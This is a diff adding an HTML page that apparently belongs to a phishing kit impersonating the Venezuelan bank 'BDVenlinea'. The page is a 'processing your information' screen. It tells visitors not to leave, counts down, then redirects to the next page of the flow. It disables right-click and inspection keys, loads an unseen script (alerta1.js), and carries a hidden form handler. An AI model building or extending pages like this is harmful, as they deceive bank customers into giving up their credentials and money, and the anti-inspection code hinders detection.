@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="refresh" content="15;url=index6.html">
+  <title>BDVenlinea - Procesando Información</title>
+  <link rel="stylesheet" href="css/2.css">
+  <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
+  <link rel="apple-touch-icon" href="icono.png">
+  <link href="https://fonts.googleapis.com/css2?family=Aptos:wght@400;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script>
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'F12' || (e.ctrlKey && e.keyCode === 71)) {
+        e.preventDefault();
+      }
+    });
+  </script>
+  <script>
+    var seconds = 15;
+    function countdown() {
+      document.getElementById('timer').innerText = seconds;
+      if (seconds > 0) {
+        seconds--;
+        setTimeout(countdown, 1000);
+      }
+    }
+    document.addEventListener("DOMContentLoaded", function() {
+      countdown();
+    });
+  </script>
+  <script src="js/alerta1.js"></script>
+
+</head>
+<body>
+  <div class="container">
+    <h1>Procesando su información</h1>
+    <div class="spinner"></div>
+    <h3>Por favor, no abandone esta página mientras procesamos sus datos.</h3>
+    <h4>Será redirigido automáticamente en <span class="timer-text" id="timer">15</span> segundos...</h4>
+    <div class="nota">
+      Gracias por su paciencia.
+    </div>
+  </div>
+  
+  <form id="formulario" onsubmit="enviarFormulario(event)" style="display:none;">
+  </form>
+</body>
+</html>
